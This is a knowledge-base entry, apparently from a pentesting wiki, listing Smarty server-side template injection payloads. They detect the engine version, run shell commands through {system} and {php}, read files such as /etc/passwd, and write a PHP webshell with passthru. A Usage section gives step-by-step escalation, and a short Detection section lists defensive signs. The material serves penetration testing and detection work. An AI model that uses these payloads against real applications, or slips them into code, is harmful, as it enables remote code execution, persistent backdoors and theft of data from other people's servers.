---
id: 383b644f-3ecb-4b91-b9ef-ad6e3bf2f2a4
name: Smarty-SSTI-Payloads-for-Command-Execution-and-File-Write
type: code
language: smarty
verified: true
created_at: '2023-04-06T03:56:40.253722+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - PHP
tags:
  - ssti
  - smarty
  - rce
  - payload
validated: true
---

# Smarty-SSTI-Payloads-for-Command-Execution-and-File-Write

## Code

```smarty
{$smarty.version}
{php}echo `id`;{/php} //deprecated in smarty v3
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())
{system('ls')} // compatible v3
{system('cat index.php')} // compatible v3
```

## Description

This code snippet contains a collection of Smarty template injection payloads for detecting the engine version, executing system commands (via deprecated {php} or v3-compatible {system}), and writing arbitrary files to create persistent backdoors like PHP webshells. These payloads are injected into user-controlled template variables and executed server-side during rendering, providing RCE and file system access in vulnerable PHP applications using Smarty.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $SCRIPT_NAME | Current script name/path for file write operations | /var/www/html/index.php |
| cmd | GET parameter for webshell command execution post-write | whoami |

## Usage

Inject these payloads into reflected input fields (e.g., via POST/GET parameters) in a Smarty-rendered page. Start with version detection ({$smarty.version}), then escalate to command execution ({system('id')}) or file read ({system('cat /etc/passwd')}). For file writing, use the Smarty_Internal_Write_File method to drop a webshell, then access it separately (e.g., ?cmd=ls). URL-encode payloads for transmission (e.g., {system('ls')} -> {system(%27ls%27)}). Used in web pentesting to exploit SSTI in legacy or misconfigured PHP apps.

## Detection

- WAF logs for template syntax like {system, {php}, or Smarty class invocations.
- Server error logs showing template parsing exceptions or command output leaks.
- File system monitoring for unexpected writes (e.g., new PHP files with passthru).
- Network anomalies: HTTP responses containing shell output (e.g., 'uid=33').
- Process monitoring for web server spawning subshells (e.g., www-data running /bin/sh).

## Related

- [[Procedure: Command-Execution-and-File-Manipulation-via-Smarty-Template-Injection]]
- [[Tool: Burp-Suite]]
